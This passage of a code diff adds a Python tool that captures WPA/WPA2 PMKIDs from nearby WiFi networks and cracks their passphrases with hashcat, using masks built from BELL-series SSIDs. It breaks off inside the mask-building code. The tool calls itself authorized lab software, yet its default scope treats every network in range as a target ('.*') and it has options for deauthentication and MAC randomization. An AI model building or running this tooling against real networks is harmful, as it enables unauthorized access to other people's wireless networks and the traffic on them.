@@ -1,0 +1,4153 @@
+#!/usr/bin/env python3
+"""
+bell-redteam - BELL-series WiFi PMKID red-team workflow.
+
+Authorized-testing tool for a controlled lab environment. Captures WPA/WPA2
+PMKIDs for BELL-series SSIDs, derives candidate passphrases, and cracks them
+with hashcat using an evidence-narrowed alphanumeric mask chain.
+
+Official toolchain implemented (hcxtools + hashcat):
+    capture    -> wifite --pmkid   (or hcxdumptool directly)
+    convert    -> hcxpcapngtool -o <hash>.22000 -E <essid-list>
+    filter     -> hcxhashtool -i <all>.22000 -o <bell>.22000 --essid-regex
+    candidates -> hcxeiutool (ESSID-derived) + hcxpsktool (weak PSK candidates)
+    crack      -> hashcat -m 22000 -a 3 (mask) / -a 0 (wordlist)
+
+Single file, Python 3 standard library only. Runs as a curses TUI by default
+and as a non-interactive CLI with subcommands.
+
+References:
+  hashcat  hc22000 format, mask attack (-a 3), .hcmask files, mode 22000
+  hcxtools hcxdumptool / hcxpcapngtool / hcxhashtool / hcxeiutool / hcxpsktool
+  wifite2  --pmkid, --pmkid-timeout, --skip-crack, --hs-dir
+  aircrack-ng  airodump-ng, airmon-ng
+"""
+
+from __future__ import annotations
+
+import argparse
+import csv
+import itertools
+import json
+import os
+import re
+import shlex
+import shutil
+import signal
+import subprocess
+import sys
+import threading
+import time
+from dataclasses import dataclass, field, asdict
+from pathlib import Path
+from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple
+
+try:
+    import curses
+except ImportError:  # the CLI stays usable without a curses build
+    curses = None  # type: ignore[assignment]
+
+APP = "bell-redteam"
+VERSION = "1.0.0"
+
+# Resolve the real user's home when running under sudo so output lands in
+# their filesystem (not just root's). Fall back to the current user otherwise.
+def _real_home() -> Path:
+    sudo_user = os.environ.get("SUDO_USER")
+    if sudo_user and sudo_user != "root":
+        try:
+            import pwd
+            return Path(pwd.getpwnam(sudo_user).pw_dir)
+        except KeyError:
+            pass
+    return Path.home()
+
+
+def chown_to_real_user(path: Path) -> None:
+    """Best-effort: hand ownership of `path` back to the invoking (sudo) user."""
+    sudo_user = os.environ.get("SUDO_USER")
+    if not sudo_user or sudo_user == "root":
+        return
+    if os.geteuid() != 0:
+        return
+    try:
+        import pwd
+        pw = pwd.getpwnam(sudo_user)
+        uid, gid = pw.pw_uid, pw.pw_gid
+    except KeyError:
+        return
+    try:
+        if path.is_dir():
+            for root, dirs, files in os.walk(path):
+                for name in dirs + files:
+                    try:
+                        os.chown(os.path.join(root, name), uid, gid)
+                    except OSError:
+                        pass
+            try:
+                os.chown(str(path), uid, gid)
+            except OSError:
+                pass
+        else:
+            try:
+                os.chown(str(path), uid, gid)
+            except OSError:
+                pass
+    except OSError:
+        pass
+
+
+DESKTOP = _real_home() / "Desktop"
+WORKDIR_DEFAULT = DESKTOP / "bell-redteam-work"
+
+# hc22000 message types. ESSID is field index 5 for every one of them.
+HC22000_TYPES = ("01", "02", "03", "04")
+
+# hashcat 6.2.6 supports -1..-4 custom charsets (7.0.0 added -5..-8).
+HASHCAT_MAX_CHARSETS = 4
+
+# WPA-PSK is 8..63 characters; hashcat's WPA kernels refuse candidates < 8.
+PSK_MIN_LEN = 8
+PSK_MAX_LEN = 63
+
+TOOLS_REQUIRED = (
+    "wifite",
+    "airodump-ng",
+    "airmon-ng",
+    "iw",
+    "hashcat",
+    "hcxdumptool",
+    "hcxpcapngtool",
+    "hcxhashtool",
+    "hcxeiutool",
+    "hcxpsktool",
+)
+TOOLS_OPTIONAL = ("tcpdump", "macchanger", "tshark", "aircrack-ng")
+
+
+# --------------------------------------------------------------------------
+# small utilities
+# --------------------------------------------------------------------------
+
+
+class Log:
+    """Line logger that writes to stderr and to a rolling log file."""
+
+    def __init__(self, path: Optional[Path] = None) -> None:
+        self.path = path
+        self.lines: List[str] = []
+        self._lock = threading.Lock()
+        self.quiet = False
+        if path:
+            path.parent.mkdir(parents=True, exist_ok=True)
+
+    def __call__(self, msg: str, level: str = "info") -> None:
+        stamp = time.strftime("%H:%M:%S")
+        text = f"[{stamp}] {msg}"
+        with self._lock:
+            self.lines.append(text)
+            if len(self.lines) > 5000:
+                self.lines = self.lines[-2500:]
+            if self.path:
+                try:
+                    with self.path.open("a", encoding="utf-8") as fh:
+                        fh.write(text + "\n")
+                except OSError:
+                    pass
+        if not self.quiet:
+            sys.stderr.write(text + "\n")
+            sys.stderr.flush()
+
+    def tail(self, n: int = 20) -> List[str]:
+        with self._lock:
+            return self.lines[-n:]
+
+
+def which(name: str) -> Optional[str]:
+    found = shutil.which(name)
+    if found:
+        return found
+    for d in ("/usr/local/sbin", "/usr/local/bin", "/usr/sbin", "/usr/bin",
+              "/sbin", "/bin"):
+        cand = os.path.join(d, name)
+        if os.path.isfile(cand) and os.access(cand, os.X_OK):
+            return cand
+    return None
+
+
+def have(name: str) -> bool:
+    return which(name) is not None
+
+
+def run(
+    cmd: Sequence[str],
+    timeout: Optional[float] = None,
+    cwd: Optional[Path] = None,
+    check: bool = False,
+    env: Optional[Dict[str, str]] = None,
+) -> subprocess.CompletedProcess:
+    """Run a command, never raising on non-zero unless check=True."""
+    merged = dict(os.environ)
+    if env:
+        merged.update(env)
+    try:
+        proc = subprocess.run(
+            list(cmd),
+            timeout=timeout,
+            cwd=str(cwd) if cwd else None,
+            capture_output=True,
+            text=True,
+            env=merged,
+            check=check,
+            stdin=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+    except subprocess.TimeoutExpired as exc:
+        return subprocess.CompletedProcess(
+            list(cmd), 124, exc.stdout or "", (exc.stderr or "") + "\n[timeout]"
+        )
+    except FileNotFoundError as exc:
+        return subprocess.CompletedProcess(list(cmd), 127, "", str(exc))
+    except OSError as exc:
+        return subprocess.CompletedProcess(list(cmd), 126, "", str(exc))
+    return proc
+
+
+def human_time(seconds: Optional[float]) -> str:
+    if seconds is None:
+        return "-"
+    seconds = float(seconds)
+    if seconds < 0:
+        return "-"
+    if seconds < 1:
+        return f"{seconds:.2f}s"
+    for unit, div in (("d", 86400), ("h", 3600), ("m", 60)):
+        if seconds >= div:
+            value = seconds / div
+            return f"{value:.1f}{unit}"
+    return f"{seconds:.0f}s"
+
+
+def human_count(n: float) -> str:
+    for unit, div in (
+        ("E", 1e18),
+        ("P", 1e15),
+        ("T", 1e12),
+        ("G", 1e9),
+        ("M", 1e6),
+        ("K", 1e3),
+    ):
+        if abs(n) >= div:
+            return f"{n / div:.3g}{unit}"
+    return f"{n:.0f}"
+
+
+def parse_bytes(text: str) -> Optional[int]:
+    m = re.search(r"(\d+)\s*([KMGT]?)i?B", text, re.IGNORECASE)
+    if not m:
+        return None
+    mult = {"": 1, "K": 1024, "M": 1024**2, "G": 1024**3, "T": 1024**4}
+    return int(m.group(1)) * mult.get(m.group(2).upper(), 1)
+
+
+def safe_int(value: str, default: int) -> int:
+    try:
+        return int(str(value).strip())
+    except (TypeError, ValueError):
+        return default
+
+
+def safe_float(value: str, default: float) -> float:
+    try:
+        return float(str(value).strip())
+    except (TypeError, ValueError):
+        return default
+
+
+def read_json(path: Path, default: Any) -> Any:
+    try:
+        with path.open("r", encoding="utf-8") as fh:
+            return json.load(fh)
+    except (OSError, ValueError):
+        return default
+
+
+def count_lines(path: Path) -> int:
+    """Count lines in a possibly non-UTF-8 candidate list."""
+    try:
+        with path.open("rb") as fh:
+            return sum(1 for _ in fh)
+    except OSError:
+        return 0
+
+
+def read_lines_text(path: Path) -> List[str]:
+    """Read a candidate list as text, tolerating non-UTF-8 bytes.
+
+    Split on lines, never on whitespace: a passphrase may contain spaces
+    and must survive as one candidate.
+    """
+    try:
+        with path.open("r", encoding="utf-8", errors="replace") as fh:
+            return fh.read().splitlines()
+    except OSError:
+        return []
+
+
+def write_json(path: Path, payload: Any) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    tmp = path.with_suffix(path.suffix + ".tmp")
+    with tmp.open("w", encoding="utf-8") as fh:
+        json.dump(payload, fh, indent=2, sort_keys=True, default=str)
+        fh.flush()
+        os.fsync(fh.fileno())
+    tmp.replace(path)
+
+
+# --------------------------------------------------------------------------
+# configuration
+# --------------------------------------------------------------------------
+
+DEFAULTS: Dict[str, Any] = {
+    # target selection
+    "interface": None,
+    # Everything in range is in scope; the BELL networks are preferred.
+    "essid_regex": "^BELL",
+    "scope_preset": "all",
+    "preferred_regex": "^BELL7..$",
+    "ssid_prefix": "BELL",
+    "mask_len": 8,
+    "mask_charset": "Aa0-9",
+    "mask_charsets": ["Aa0-9"],
+    "keyspace_charsets": [
+        "0123456789",
+        "0123456789ABCDEF",
+        "0123456789abcdef",
+        "0123456789ABCDEFabcdef",
+    ],
+    "mask_prefix": True,
+    "include_prefixed": False,
+    "include_evidence_masks": False,
+    "policy_masks": True,
+    "mask_order": "bell-first",  # effective | bell-first | requested
+    # capture
+    "capture_backend": "wifite",  # wifite | hcxdumptool
+    "monitor_mode": "physical",  # physical | airmon | managed
+    "pmkid_timeout": 120,
+    "scan_seconds": 60,
+    "allow_deauth": False,
+    "deauth_count": 1,
+    "randomize_mac": False,
+    "stop_networkmanager": True,
+    "build_bpf": True,
+    # resources
+    "hashcat_cores": 2,
+    "hashcat_device_ids": "",
+    "max_hours_per_step": 0.0,  # 0 = unlimited (run until done or stopped)
+    "allow_huge_keyspace": False,
+    "hashcat_speed": None,  # H/s override; None -> auto-detect
+    # candidates
+    "wordlist": "/usr/share/wordlists/rockyou.txt",
+    "use_hcxeiutool": True,
+    "use_rules": True,
+    "rule_file": "/usr/share/hashcat/rules/best64.rule",
+    "use_hcxpsktool": True,
+    "hcxpsktool_full": False,
+    "phases": ["capture", "convert", "filter", "plan", "attack", "report"],
+}
+
+CHOICES = {
+    "scope_preset": ["all", "bell7", "bell", "custom"],
+    "capture_backend": ["wifite", "hcxdumptool"],
+    "monitor_mode": ["physical", "airmon", "managed"],
+    "mask_order": ["effective", "bell-first", "requested"],
+    "phases": [
+        "capture",
+        "convert",
+        "filter",
+        "plan",
+        "attack",
+        "report",
+    ],
+}
+
+
+@dataclass
+class Config:
+    data: Dict[str, Any] = field(default_factory=lambda: dict(DEFAULTS))
+
+    @classmethod
+    def load(cls, path: Path) -> "Config":
+        stored = read_json(path, {}) or {}
+        merged = dict(DEFAULTS)
+        merged.update({k: v for k, v in stored.items() if k in DEFAULTS})
+        return cls(merged)
+
+    def save(self, path: Path) -> None:
+        write_json(path, self.data)
+
+    def get(self, key: str, default: Any = None) -> Any:
+        return self.data.get(key, DEFAULTS.get(key, default))
+
+    def set(self, key: str, value: Any) -> None:
+        self.data[key] = value
+
+    def __getitem__(self, key: str) -> Any:
+        return self.data[key]
+
+    def __setitem__(self, key: str, value: Any) -> None:
+        self.data[key] = value
+
+
+# --------------------------------------------------------------------------
+# interface enumeration
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class WirelessIface:
+    name: str
+    mac: str = ""
+    kind: str = "managed"  # managed | monitor | other
+    phy: str = ""
+    channel: Optional[int] = None
+    txpower: Optional[float] = None
+    virtual: bool = False
+    channels: List[int] = field(default_factory=list)
+
+    @property
+    def label(self) -> str:
+        tag = "virtual" if self.virtual else "physical"
+        return f"{self.name} ({tag}, {self.kind})"
+
+    def to_dict(self) -> Dict[str, Any]:
+        d = asdict(self)
+        d["label"] = self.label
+        return d
+
+
+def _parse_iw_phy_channels(phy: str) -> List[int]:
+    """Supported channels from `iw phy <phy> info`."""
+    if not phy:
+        return []
+    proc = run(["iw", "phy", phy, "info"], timeout=15)
+    if proc.returncode != 0:
+        return []
+    channels: List[int] = []
+    for line in proc.stdout.splitlines():
+        # iw prints "  * 2412.0 MHz [1] (22.0 dBm)"
+        if "MHz" not in line:
+            continue
+        m = re.search(r"\[\s*(\d+)\s*\]", line)
+        if m:
+            channels.append(int(m.group(1)))
+    return sorted(set(channels))
+
+
+def list_interfaces(include_channels: bool = True) -> List[WirelessIface]:
+    """Enumerate wireless interfaces from `iw dev`.
+
+    airmon-ng style virtual monitors (wlanmon0, mon1) are flagged virtual so
+    the UI can warn: hcxdumptool's own guidance is to avoid virtual
+    interfaces and to let it set monitor mode itself.
+    """
+    proc = run(["iw", "dev"], timeout=15)
+    if proc.returncode != 0:
+        return []
+
+    ifaces: List[WirelessIface] = []
+    current: Optional[WirelessIface] = None
+    phy = ""
+
+    for raw in proc.stdout.splitlines():
+        line = raw.strip()
+        if line.startswith("phy#"):
+            # "phy#0" in `iw dev` output, "phy0" for `iw phy <name> info`
+            phy = line.split()[0].replace("#", "")
+            current = None
+            continue
+        if line.startswith("Interface "):
+            name = line.split(None, 1)[1].strip()
+            current = WirelessIface(name=name, phy=phy)
+            current.virtual = bool(re.match(r"^(wlan)?mon\d+$", name))
+            ifaces.append(current)
+            continue
+        if line.startswith("Unnamed/non-netdev interface"):
+            current = None
+            continue
+        if current is None:
+            continue
+        if line.startswith("addr "):
+            current.mac = line.split(None, 1)[1].strip()
+        elif line.startswith("type "):
+            current.kind = line.split(None, 1)[1].strip()
+        elif line.startswith("channel "):
+            m = re.search(r"channel\s+(\d+)", line)
+            if m:
+                current.channel = int(m.group(1))
+        elif line.startswith("txpower "):
+            m = re.search(r"txpower\s+([\d.]+)", line)
+            if m:
+                current.txpower = float(m.group(1))
+
+    if include_channels:
+        cache: Dict[str, List[int]] = {}
+        for iface in ifaces:
+            if iface.phy not in cache:
+                cache[iface.phy] = _parse_iw_phy_channels(iface.phy)
+            iface.channels = list(cache[iface.phy])
+    return ifaces
+
+
+_MONITOR_CAPABLE: Dict[str, bool] = {}
+
+
+def monitor_capable(iface: WirelessIface) -> bool:
+    """True when the driver can be switched to monitor mode."""
+    if iface.name in _MONITOR_CAPABLE:
+        return _MONITOR_CAPABLE[iface.name]
+    if not iface.phy:
+        _MONITOR_CAPABLE[iface.name] = False
+        return False
+    proc = run(["iw", "phy", iface.phy, "info"], timeout=15)
+    if proc.returncode != 0:
+        _MONITOR_CAPABLE[iface.name] = False
+        return False
+    result = "monitor" in proc.stdout.lower()
+    _MONITOR_CAPABLE[iface.name] = result
+    return result
+
+
+def adapter_driver(iface: str) -> str:
+    """Return the kernel driver name for a network interface, or ''."""
+    try:
+        link = Path(f"/sys/class/net/{iface}/device/driver")
+        if link.exists() or link.is_symlink():
+            return link.resolve().name
+    except OSError:
+        pass
+    return ""
+
+
+USB_WIFI_DRIVERS = {
+    "rt2800usb", "rt2870sta", "rt2500usb", "rt73usb",   # Ralink
+    "ath9k_htc", "ath9k",                                 # Atheros / TP-Link v1
+    "rtl8188eu", "r8188eu", "rtl8xxxu",                  # Realtek / TP-Link v2
+    "rtl8812au", "rtl8821au", "rtw88_8821au",           # TP-Link Archer
+    "rtl8187", "rtl8192cu", "rtl8192eu",                 # older Realtek
+}
+
+RALINK_DRIVERS = {"rt2800usb", "rt2870sta", "rt2500usb", "rt73usb"}
+
+
+def interface_rank(iface: WirelessIface) -> tuple:
+    """Sort key: Ralink USB adapters first, then physical, then monitor-capable."""
+    driver = adapter_driver(iface.name).lower()
+    return (
+        0 if driver in RALINK_DRIVERS else 1,
+        1 if iface.virtual else 0,
+        0 if monitor_capable(iface) else 1,
+        iface.name,
+    )
+
+
+def preferred_interface(ifaces: Sequence[WirelessIface]) -> Optional[WirelessIface]:
+    """Return the adapter the UI should select by default."""
+    return min(ifaces, key=interface_rank) if ifaces else None
+
+
+# --------------------------------------------------------------------------
+# scanning
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class Target:
+    essid: str
+    bssid: str
+    channel: Optional[int] = None
+    encr: str = ""
+    signal: int = -100
+    length: int = 0
+    selected: bool = False
+
+    def to_dict(self) -> Dict[str, Any]:
+        return asdict(self)
+
+
+def _norm_essid(raw: str) -> str:
+    return raw.replace("\x00", "").strip()
+
+
+def parse_airodump_csv(path: Path) -> List[Target]:
+    """Parse the 'Parsed Airodump-ng capture file' CSV.
+
+    The header written by airodump-ng is:
+
+        BSSID, First time seen, Last time seen, channel, Speed, Privacy,
+        Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length,
+        ESSID, Key
+
+    so the ESSID is column 13, the channel column 3 and the signal
+    ("Power") column 8.  Station rows use a different header and are
+    skipped.
+    """
+    targets: List[Target] = []
+    try:
+        with path.open("r", encoding="utf-8", errors="replace", newline="") as fh:
+            reader = csv.reader(fh)
+            rows = list(reader)
+    except OSError:
+        return targets
+
+    for row in rows:
+        if len(row) < 14:
+            continue
+        mac = row[0].strip()
+        if not re.fullmatch(r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}", mac):
+            continue
+        # airodump-ng's -01.csv layout (upstream dump_write.c):
+        #   0 BSSID, 1 First time seen, 2 Last time seen, 3 channel,
+        #   4 Speed, 5 Privacy, 6 Cipher, 7 Authentication, 8 Power,
+        #   9 # beacons, 10 # IV, 11 LAN IP, 12 ID-length, 13 ESSID, 14 Key
+        essid = _norm_essid(row[13])
+        if not essid:
+            continue
+        targets.append(
+            Target(
+                essid=essid,
+                bssid=mac.lower(),
+                channel=safe_int(row[3], 0) or None,
+                encr=f"{row[5].strip()} {row[6].strip()}",
+                signal=safe_int(row[8], -100),
+                length=safe_int(row[12], 0),
+            )
+        )
+    return targets
+
+
+def _verify_monitor_mode(iface: str, log: Log) -> bool:
+    """Check that the interface is in monitor mode; log and return False if not."""
+    proc = run(["iw", "dev", iface, "info"], timeout=15)
+    if proc.returncode != 0:
+        log(f"scan: could not read interface {iface} state", "warn")
+        return False
+    if re.search(r"type\s+monitor\b", proc.stdout):
+        return True
+    log(f"scan: {iface} is not in monitor mode; airodump-ng may produce empty results", "warn")
+    return False
+
+
+def scan(
+    iface: str,
+    seconds: int,
+    outdir: Path,
+    log: Log,
+    channel: Optional[int] = None,
+) -> List[Target]:
+    """Run airodump-ng for `seconds`, then flush and parse its CSV."""
+    seconds = max(60, int(seconds or 0))
+    outdir.mkdir(parents=True, exist_ok=True)
+    _verify_monitor_mode(iface, log)
+    prefix = outdir / f"scan_{int(time.time())}"
+    cmd = ["airodump-ng", iface, "-w", str(prefix)]
+    if channel:
+        cmd += ["-c", str(channel)]
+    log(f"scan: {' '.join(shlex.quote(c) for c in cmd)} ({seconds}s)")
+    if not _verify_monitor_mode(iface, log):
+        log("scan: continuing anyway - results may be empty", "warn")
+    proc = subprocess.Popen(
+        cmd,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.PIPE,
+        cwd=str(outdir),
+        start_new_session=True,
+    )
+    try:
+        time.sleep(max(1, seconds))
+    finally:
+        proc.send_signal(signal.SIGINT)
+        try:
+            proc.wait(timeout=15)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=5)
+
+    stderr_output = proc.stderr.read().decode("utf-8", errors="replace") if proc.stderr else ""
+
+    csv_path = Path(f"{prefix}-01.csv")
+    if not csv_path.exists():
+        matches = sorted(outdir.glob(f"{prefix.name}*.csv"))
+        csv_path = matches[0] if matches else csv_path
+    targets = parse_airodump_csv(csv_path) if csv_path.exists() else []
+    log(f"scan: {len(targets)} access points observed")
+    if not targets:
+        if stderr_output:
+            log(f"scan: airodump-ng said: {stderr_output[-400:]}", "warn")
+        else:
+            log("scan: no access points observed. If you are using an "
+                "internal adapter, try a Ralink/TP-Link USB adapter in "
+                "monitor mode.", "warn")
+    return targets
+
+
+def scope_regex(cfg: Config) -> str:
+    """The in-scope filter, chosen from a preset so nothing has to be typed."""
+    preset = str(cfg.get("scope_preset") or "all")
+    if preset == "all":
+        return ".*"
+    if preset == "bell7":
+        return "^BELL7..$"
+    if preset == "bell":
+        return "^BELL"
+    return str(cfg.get("essid_regex") or "^BELL")
+
+
+def is_preferred(essid: str, cfg: Config) -> bool:
+    """True when the ESSID belongs to the preferred set (BELL7 by default)."""
+    pattern = str(cfg.get("preferred_regex") or "")
+    if not pattern:
+        return False
+    try:
+        return re.search(pattern, essid, re.IGNORECASE) is not None
+    except re.error:
+        return False
+
+
+def filter_targets(
+    targets: Iterable[Target], pattern: str
+) -> List[Target]:
+    """Keep targets whose ESSID matches `pattern` (regex, case-insensitive)."""
+    try:
+        rx = re.compile(pattern, re.IGNORECASE)
+    except re.error as exc:
+        raise ValueError(f"invalid essid_regex {pattern!r}: {exc}") from exc
+    out = [t for t in targets if rx.search(t.essid)]
+    seen = set()
+    unique = []
+    for t in out:
+        key = (t.essid, t.bssid)
+        if key in seen:
+            continue
+        seen.add(key)
+        unique.append(t)
+    return unique
+
+
+# --------------------------------------------------------------------------
+# hc22000 hash handling
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class HashEntry:
+    raw: str
+    mtype: str
+    essid: str
+    bssid: str
+    sta: str
+    pmkid: str = ""
+
+    def to_dict(self) -> Dict[str, Any]:
+        return asdict(self)
+
+
+def _hex_to_text(value: str) -> str:
+    if not value or len(value) % 2:
+        return ""
+    try:
+        blob = bytes.fromhex(value)
+    except ValueError:
+        return ""
+    try:
+        return blob.decode("utf-8")
+    except UnicodeDecodeError:
+        return blob.decode("latin-1", errors="ignore")
+
+
+def _text_to_hex(value: str) -> str:
+    return value.encode("utf-8", errors="ignore").hex()
+
+
+def parse_22000(line: str) -> Optional[HashEntry]:
+    """Parse one hc22000 line.
+
+    Canonical layout (hashcat wiki / hcxtools):
+        WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
+        WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE*EAPOL*MESSAGEPAIR
+    ESSID sits at field index 5 in both. A tolerant fallback scans the
+    fields for the first hex blob that decodes to a printable SSID.
+    """
+    line = line.strip()
+    if not line or not line.startswith("WPA*"):
+        return None
+    fields = line.split("*")
+    if len(fields) < 6:
+        return None
+    mtype = fields[1]
+    if mtype not in HC22000_TYPES:
+        return None
+
+    essid = _hex_to_text(fields[5]) if len(fields) > 5 else ""
+    bssid = fields[3].lower() if len(fields) > 3 else ""
+    sta = fields[4].lower() if len(fields) > 4 else ""
+    pmkid = fields[2].lower() if mtype == "01" and len(fields) > 2 else ""
+
+    if not essid:
+        for field in fields[2:]:
+            candidate = _hex_to_text(field)
+            if candidate and all(32 <= ord(ch) < 127 for ch in candidate):
+                essid = candidate
+                break
+
+    if not essid:
+        return None
+    return HashEntry(
+        raw=line, mtype=mtype, essid=essid, bssid=bssid, sta=sta, pmkid=pmkid
+    )
+
+
+def load_22000(path: Path) -> List[HashEntry]:
+    entries: List[HashEntry] = []
+    try:
+        text = path.read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return entries
+    for line in text.splitlines():
+        if not line.strip():
+            continue
+        entry = parse_22000(line)
+        if entry:
+            entries.append(entry)
+    return entries
+
+
+def write_22000(path: Path, entries: Iterable[HashEntry]) -> int:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    count = 0
+    with path.open("w", encoding="utf-8") as fh:
+        for entry in entries:
+            fh.write(entry.raw.rstrip("\n") + "\n")
+            count += 1
+    return count
+
+
+# --------------------------------------------------------------------------
+# attack plan: mask chain + candidate wordlists
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class MaskVariant:
+    label: str
+    charsets: List[str]
+    mask: str
+    keyspace: int
+    note: str = ""
+
+
+@dataclass
+class Step:
+    name: str
+    kind: str  # mask | wordlist
+    desc: str
+    group: str
+    keyspace: int = 0
+    est_seconds: Optional[float] = None
+    charsets: List[str] = field(default_factory=list)
+    mask: str = ""
+    mask_file: Optional[Path] = None
+    wordlist: Optional[Path] = None
+    hashes: Optional[Path] = None
+    skip_reason: str = ""
+
+    @property
+    def skippable(self) -> bool:
+        return bool(self.skip_reason)
+
+    def to_dict(self) -> Dict[str, Any]:
+        d = asdict(self)
+        d["wordlist"] = str(self.wordlist) if self.wordlist else None
+        d["hashes"] = str(self.hashes) if self.hashes else None
+        d["mask_file"] = str(self.mask_file) if self.mask_file else None
+        d["est_seconds"] = self.est_seconds
+        return d
+
+
+def expand_charset(spec: str) -> str:
+    """Expand a charset spec like 'Aa0-9' into the literal character set."""
+    spec = (spec or "").strip()
+    if not spec:
+        return ""
+    if spec.startswith("?") and len(spec) > 1:
+        mapping = {
+            "l": "abcdefghijklmnopqrstuvwxyz",
+            "u": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+            "d": "0123456789",
+            "s": " !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~",
+            "a": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+        }
+        out = []
+        for ch in spec[1:]:
+            out.append(mapping.get(ch.lower(), ""))
+        return "".join(out)
+
+    # "A" -> A-Z, "a" -> a-z, "0" or any bare digit -> 0-9, "X-Y" -> a
+    # literal range. "Aa0-9" and "Aa09" therefore both yield the 62
+    # character alphanumeric set.
+    classes = {
+        "A": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+        "a": "abcdefghijklmnopqrstuvwxyz",
+        "0": "0123456789",
+    }
+    out: List[str] = []
+    i = 0
+    while i < len(spec):
+        ch = spec[i]
+        if i + 2 < len(spec) and spec[i + 1] == "-":
+            start, end = spec[i], spec[i + 2]
+            out.extend(chr(c) for c in range(ord(start), ord(end) + 1))
+            i += 3
+            continue
+        if ch.isdigit():
+            out.append(classes["0"])
+        else:
+            out.append(classes.get(ch, ch))
+        i += 1
+    seen = set()
+    unique = []
+    for ch in out:
+        if ch not in seen:
+            seen.add(ch)
+            unique.append(ch)
+    return "".join(unique)
+
+
+def _class_of(ch: str) -> str:
+    if ch.isdigit():
+        return "d"
+    if ch.isupper():
+        return "u"
+    if ch.islower():
+        return "l"
+    return "o"
+
+
+def _pow_size(charsets: Sequence[str], slots: Sequence[int]) -> int:
+    """Keyspace of masked positions, each bound to a charset slot."""
+    total = 1
+    for slot in slots:
+        if 1 <= slot <= len(charsets):
+            total *= max(1, len(charsets[slot - 1]))
+        else:
+            total *= 1
+    return total
+
+
+def _slot_assignment(sets: Sequence[str]) -> Optional[List[int]]:
+    """Map each position to a charset slot index.
+
+    Returns None when more than HASHCAT_MAX_CHARSETS distinct charsets are
+    needed (hashcat 6.2.6 provides only -1..-4).
+    """
+    distinct: List[str] = []
+    for s in sets:
+        if s not in distinct:
+            distinct.append(s)
+    if not distinct or len(distinct) > HASHCAT_MAX_CHARSETS:
+        return None
+    index = {cs: i + 1 for i, cs in enumerate(distinct)}
+    return [index[s] for s in sets]
+
+
+def build_mask_variants(
+    prefix: str,
+    mask_len: int,
+    charset_spec: str,
+    essids: Sequence[str],
+) -> List[MaskVariant]:
+    """Build the ordered mask chain for one ESSID length group.
+
+    The mask length is the passphrase length (mask_len), not the ESSID
+    length: a Bell SSID such as "BELL726" is 7 characters, but the WPA2 key
+    is 8, and hashcat's WPA kernels refuse candidates shorter than 8. The
+    ESSID contributes the charset evidence, the mask length comes from the
+    configuration.
+
+    Variants, narrowest first:
+      1. position-exact  - per-position observed character sets
+      2. position-class  - per-position observed character classes
+      3. global-observed - union of every observed character
+    The configured charsets (the requested masks) are added by the caller so
+    they always appear in the chain.
+    """
+    variants: List[MaskVariant] = []
+    if not essids:
+        return variants
+
+    length = len(essids[0])
+    masked = mask_len - len(prefix)
+    if masked < 1:
+        return variants
+
+    # The literal prefix is taken from the observed ESSIDs so that a
+    # lowercase SSID such as "bell726" yields a lowercase literal too.
+    observed_prefixes: List[str] = []
+    for essid in essids:
+        if essid[: len(prefix)].upper() == prefix.upper():
+            literal = essid[: len(prefix)]
+            if literal not in observed_prefixes:
+                observed_prefixes.append(literal)
+    if not observed_prefixes:
+        observed_prefixes = [prefix]
+
+    def class_chars(chars: str) -> str:
+        out = ""
+        for cl in ("d", "u", "l", "o"):
+            if cl in {_class_of(c) for c in chars}:
+                out += {
+                    "d": "0123456789",
+                    "u": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+                    "l": "abcdefghijklmnopqrstuvwxyz",
+                    "o": "".join(sorted(c for c in chars if _class_of(c) == "o")),
+                }[cl]
+        return out
+
+    def unique(seq: Iterable[str]) -> List[str]:
+        out: List[str] = []
+        for item in seq:
+            if item not in out:
+                out.append(item)
+        return out
+
+    for literal in observed_prefixes:
+        tag = "" if literal == prefix else f":{literal}"
+        per_position: List[str] = ["" for _ in range(masked)]
+        for essid in essids:
+            if essid[: len(prefix)].upper() != prefix.upper():
+                continue
+            suffix = essid[len(prefix) :]
+            for i, ch in enumerate(suffix[:masked]):
+                per_position[i] += ch
+
+        per_position = ["".join(sorted(set(s))) for s in per_position]
+        global_chars = "".join(
+            sorted(set("".join(p for p in per_position if p)))
+        )
+
+        # 1. position-exact: usable when every masked position was observed
+        if len(essids) >= 3 and all(per_position):
+            slots = _slot_assignment(per_position)
+            if slots:
+                charsets = unique(per_position)
+                mask = literal + "".join(f"?{slot}" for slot in slots)
+                variants.append(
+                    MaskVariant(
+                        label=f"position-exact[{length}]{tag}",
+                        charsets=charsets,
+                        mask=mask,
+                        keyspace=_pow_size(charsets, slots),
+                        note="per-position charset from observed ESSID suffixes",
+                    )
+                )
+
+        # 2. position-class: unobserved positions fall back to the global class
+        class_sets: List[str] = []
+        for observed in per_position:
+            chars = (
+                class_chars(observed) if observed else class_chars(global_chars)
+            )
+            class_sets.append(chars)
+        slots = _slot_assignment(class_sets)
+        if slots and all(class_sets):
+            charsets = unique(class_sets)
+            mask = literal + "".join(f"?{slot}" for slot in slots)
+            variants.append(
+                MaskVariant(
+                    label=f"position-class[{length}]{tag}",
+                    charsets=charsets,
+                    mask=mask,
+                    keyspace=_pow_size(charsets, slots),
+                    note="per-position character classes (digits/upper/lower/other)",
+                )
+            )
+
+        # 2b. position-hybrid: the exact observed set where a position was
+        # seen, the character class where it was not. For "BELL" + 3 digits
+        # and an 8 character passphrase this keeps the three digit
+        # positions exact and completes the fourth with the digit class.
+        hybrid_sets: List[str] = []
